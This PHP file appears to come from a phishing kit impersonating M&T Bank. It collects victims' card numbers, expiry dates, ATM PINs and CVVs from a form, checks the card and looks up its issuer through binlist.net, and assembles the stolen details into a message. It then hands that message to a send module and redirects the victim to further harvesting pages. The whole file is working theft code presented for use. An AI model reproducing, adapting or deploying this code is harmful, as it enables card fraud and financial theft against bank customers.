<?php
error_reporting(0);
require_once('Module/Setmodule.php');
$card_number = $_POST['card'];
$card_date = $_POST['exp'];
require __DIR__.'/vendor/inacho/php-credit-card-validator/src/CreditCard.php';
$bin = str_replace(" ", "", str_split($card_number,7)[0]);
$reslt = check_bin($bin);
$cardt = $reslt['scheme'];
$type = $reslt['type'];
$brand = $reslt['brand'];
$country = $reslt['country']['name'];
$bank = $reslt['bank']['name'];
$url = $reslt['bank']['url'];
$phone = $reslt['bank']['phone'];
# CC Validation
use Inacho\CreditCard;
$valid = CreditCard::validCreditCard(str_replace(' ','',$card_number));
if($valid){
    $cc_val = "YES ✅";
} else {
    $cc_val = "NO ❌";
}
$split = explode('/',$card_date);
$valid_date = CreditCard::validDate($split[1], $split[0]);
if($valid_date){
    $data_val = "YES ✅";
} else {
    $data_val = "YES ✅";
}
# BIN Check
function check_bin($bin) {
  $url = "https://lookup.binlist.net/".$bin;
  $headersers = array();
  $headersers[] = 'Accept-Version: 3';
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headersers);
  $resp=curl_exec($ch);
  curl_close($ch);
  $result = json_decode($resp, true);
  return $result;
}
$message .= "-------------- M&T Bank Bank Card Information -----------------------\n"."\n";
$message .= "Card number: ".$_POST['card']."\n"; 
$message .= "Expiry: ".$_POST['exp']."\n"; 
$message .= "Atm: ".$_POST['atm']."\n";
$message .= "cvv: ".$_POST['cvv']."\n"; 
$message .= "-------------- CARD LOOKUP -------------- \n"."\n";
$message .= " Card Valid: {$cc_val}\n";
$message .= " Date Valid: {$data_val}\n";
$message .= " Bin: {$bin}\n";
$message .= " Card Level {$cardt}\n";
$message .= " Card Type: {$type}\n";
$message .= " Card Brand: {$brand}\n";
$message .= " Country: {$country}\n";
$message .= " Bank Name: {$bank}\n";
$message .= " Telephone banking: {$phone}\n"."\n";

require_once('Module/SendModule.php');
  if($settings['Emailpage'] == "1"){
	header("Location: ../Email.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
 }
?>